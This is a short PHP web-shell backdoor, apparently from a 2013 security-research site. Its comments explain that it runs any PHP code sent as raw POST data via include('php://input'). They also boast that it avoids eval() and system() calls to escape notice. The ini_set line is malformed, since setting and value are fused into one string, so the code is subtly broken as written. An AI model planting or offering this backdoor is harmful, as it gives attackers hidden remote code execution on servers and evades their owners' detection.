// php://input based backdoor
// uses include('php://input') to execute arbritary code
// Any valid PHP code sent as raw POST data to backdoor is ran
// overrides the php.ini settings using ini_set :)
// Insecurety Research 2013 | insecurety.net
<?php
ini_set('allow_url_include, 1'); // Allow url inclusion in this script
// No eval() calls, no system() calls, nothing normally seen as malicious.
include('php://input');
?>
